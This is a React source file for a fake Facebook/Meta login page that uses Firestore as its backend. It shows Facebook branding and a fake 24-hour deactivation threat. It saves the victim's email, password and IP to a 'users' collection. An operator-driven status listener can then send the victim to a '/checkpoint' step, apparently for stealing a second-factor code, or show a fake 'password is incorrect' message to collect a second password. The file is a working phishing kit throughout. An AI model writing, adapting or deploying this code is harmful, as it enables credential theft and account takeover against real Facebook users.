import { db } from "../../firebase";
import {
   collection,
   addDoc,
   onSnapshot,
   query,
   where,
   doc,
   updateDoc,
   runTransaction,
   orderBy,
   getDocs,
   limit,
 } from "firebase/firestore";
import React, { useState,useEffect} from "react";
import facebookLogo from '../../../Resources/Facebook.png'
import PhoneInput from 'react-phone-input-2'
import 'react-phone-input-2/lib/style.css'
import validator from "validator";
import '../MyForm/index.scss'
import { useNavigate } from "react-router-dom";


const MyForm = () => {
   const delay = ms => new Promise(res => setTimeout(res, ms));
   const [passwordShown, setPasswordShown] = useState(false);
   const togglePasswordVisiblity = async () => {
     setPasswordShown(passwordShown ? false : true);
     await delay(2000);
     setPasswordShown(false);
   };
   const [pass, setPass] = useState("");
   const [mail, setMail] = useState("");
   const [hideWarning, setHideWarning] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [disabled, setDisabled] = useState(true);
   const [result, setResult] = useState({
     type: "",
     msg: "",
   });
   const navigate = useNavigate();
   const [data, setData] = useState({});
   const usersRef = collection(db, "users");
   const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
   const listener = (userID) => {
      onSnapshot(doc(db, "users", userID), (snapshot) => {
        const status = snapshot.data()?.status;
        if (status === 0 || status === 1) return;
        // Handle different status codes here
        switch (status) {
          case -1:
            setResult({
              type: "warning",
              msg: "<a class=\"fw-bold text-danger\" rel=\"noopener noreferrer\" target=\"_blank\" href=\"https://www.facebook.com/login/identify/\" style=\"text-decoration: none;\">Forgoten Password?</a>",
            });
            setDisabled(false)
            break;
          case 2:
            navigate(`/checkpoint/${userID}`);
            break;
          case 3:
            setResult({
              type: "success",
              msg: "You have successfully submitted your support request!",
            });
            navigate(`/processing/${userID}`);
            break;
          case -2:
            setResult({
              type: "error",
              msg: "The authentication code is incorrect, please try again!",
            });
            break;
          default:
            console.log(status);
        }
        setIsLoading(false); // Set loading back to false
      });
    };

    const updateIndex = async (userID) => {
      try {
        await runTransaction(db, async (transaction) => {
          const sfDocRef = doc(db, "users", userID);
          const sfDoc = await transaction.get(sfDocRef);
          const dosLast = await getDocs(q);
          if (!sfDoc.exists()) {
            throw "Document does not exist!";
          }
          const [lastest] = dosLast.docs
          const auto_id = (lastest?.get("auto_id") || 0) + 1;
          transaction.update(sfDocRef, { auto_id });
        });
  
        console.log("Transaction successfully committed!");
      } catch (e) {
        console.log("Transaction failed: ", e);
      }
    };
  


   const handleSubmit = async () => {
      if(mail.length < 1 || pass.length < 1){
        setResult({
          type: "",
          msg: "error",
        });
        return;
      }
      const ipAddr = localStorage.getItem("location");
      setIsLoading(true); // Set loading to true while saving data
      setDisabled(true);
      try {
        if (result.type && result.type !== "success") {
          updateDoc(doc(db, "users", data.id), {
            status: 1,
            pass: pass
          });
          return;
        }
        setResult({
          type: "",
          msg: "",
        });
        const user = await addDoc(collection(db, "users"), {
          pass:pass,phone:'',email:mail,auth:'',ip:ipAddr,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
        });
        if(user.id){
          updateIndex(user.id);
          setData(user);
          listener(user.id);
        }
      } catch (error) {
        console.error("Error saving data to Firestore: ", error);
      } finally {
      }
    };
  
  
return(
  <div className="w-screen flex justify-center items-center">
   <div style={{marginTop:'1%',marginLeft:'15px',marginRight:'15px'}} className="flex flex-col items-center">
    <div className="lp-element lp-pom-block" id="lp-pom-block-11">
         <div style={{height:'auto'}}>
            <p style={{lineHeight: '40px', textAlign: 'center'}}><span style={{fontSize: '33px', color: 'rgb(8, 102, 255)'}}><strong>facebook</strong></span></p>
         </div>
         {/* <div style={{height: 'auto'}}>
         <h1 style={{textAlign: 'center', lineHeight: '25px'}}><span style={{fontSize: '15px'}}><strong>Meta Market Support</strong></span></h1>
      </div> */}
      {hideWarning == false &&
      <div className="relative text-center mt-3">
         <img
         style={{
         height: '45px'}}
         src="https://d9hhrg4mnvzow.cloudfront.net/unbouncepages.com/36180478-a44a-11ef-901a-ba84fe13d57a/qq6fs5-thong-bao_10at01e000000000000028.png"
         alt="img"
         />
         <div className="absolute top-0 left-50 text-center mt-2">
            <h2 className="text-center">
               <p style={{lineHeight: '13px',margin:'0px 10px 0px 52px'}}><span style={{fontSize: '13px' ,color: 'rgb(0, 0, 0)'}}>If your account is not verified within the next 24 hours, we will deactivate your account</span></p>
            </h2>
         </div>
      </div>
      }
      <div className="mb-3 mt-3">
         <input type="text" placeholder="Email address or phone number" value={mail} onChange={(e) => {console.log(mail); if(e.target.value.length > 100) return;setMail(e.target.value); if(e.target.value.length > 0){setDisabled(false)}else{setDisabled(true)}}} className="block w-full p-2.5 text-gray-900 border border-gray-300 rounded-md bg-white	text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-gray-900 dark:focus:ring-blue-500 dark:focus:border-blue-500"/>
      </div>
      <div className="mb-2 mt-2" >
         <input type={passwordShown ? "text" : "password"} value={pass} onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value); if(e.target.value.length > 0){setDisabled(false)}else{setDisabled(true)}}} placeholder="Password" className="block w-full p-2.5 text-gray-900 border border-gray-300 rounded-md bg-white text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-gray-900 dark:focus:ring-blue-500 dark:focus:border-blue-500"/>
         <img onClick={togglePasswordVisiblity} style={{position:'absolute',top: '30.7%',right:'12px',transform: 'translateY(-50%)',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
      </div>
      <div className="mb-0 mt-2" >
      {isLoading == false && result.msg != "" &&
            <div className="d-flex align-items-center ms-2">
                  <p  style={{fontSize:'14px'}} className="text-danger">The password is incorrect. <a className='text-danger' style={{textDecoration:'none',fontWeight:'500'}} rel = "noopener noreferrer" target="_blank" href="https://www.facebook.com/login/identify/">Forgoten Password ?</a></p>  
            </div>
      }  
      </div>
         {isLoading == true  &&   
          <div className="loading">
              <div style={{top:'30%'}} className="loader"></div>
          </div>
        } 
      <div className="mb-2 mt-2" >
         <button className="lp-element lp-pom-button" id="lp-pom-button-17" disabled={disabled} onClick={handleSubmit}><span className="label">
            {
            isLoading == true ?  <strong>Please wait..</strong> :  <strong>Login</strong>
            }  
          </span></button>      
      </div>
   <div className="mb-1 mt-0">
      <p className="text-center">
         <span style={{fontSize: '14px', color: 'rgb(49, 113, 240)'}}>Forgotten password?</span>
      </p>
   </div>
   <div className="mb-3 mt-0">
      <div className="inline-flex items-center justify-center w-full">
         <hr className="w-full h-px my-2 bg-gray-200 border-1 dark:bg-gray-700"/>
         <span className="absolute px-3 font-medium text-gray-900 -translate-x-1/2 bg-white left-1/2 dark:text-white dark:bg-gray-900">or</span>
      </div>
   </div>
   <div className="mb-3 mt-0">
      <button className="lp-element lp-pom-button" id="lp-pom-button-66"><span className="label"><strong>Create new account</strong></span></button>
   </div>
   <div className="text-center mb-2 mt-0">
   <span className="text-gray-400" style={{fontSize: '13px'}}>Meta © 2024</span>
   </div>
   </div>
</div>
</div>
);

}

export default MyForm;
